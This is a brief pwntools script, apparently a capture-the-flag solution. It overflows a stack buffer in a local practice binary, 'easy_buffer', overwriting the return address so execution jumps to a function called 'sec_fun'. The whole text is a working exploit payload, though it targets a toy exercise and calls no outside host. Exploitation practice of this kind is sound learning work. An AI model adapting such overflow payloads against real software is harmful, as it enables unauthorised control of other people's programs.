from pwn import *

exe = './easy_buffer'
elf = ELF(exe)

# The target address sec_fun to jump
target_address = p32(0x0804846B)
# p32 handles Little Endian conversion

# Buffer is at EBP-14. Return address is at EBP+4.
# Distance = 14 + 4 = 18 bytes
padding = b'A' * 10
temp = p32(0x00004050)
pad2 = b'C'*4

payload = padding + temp + pad2 + target_address

p = process(exe)

p.sendline(payload)

print(p.recvall().decode())
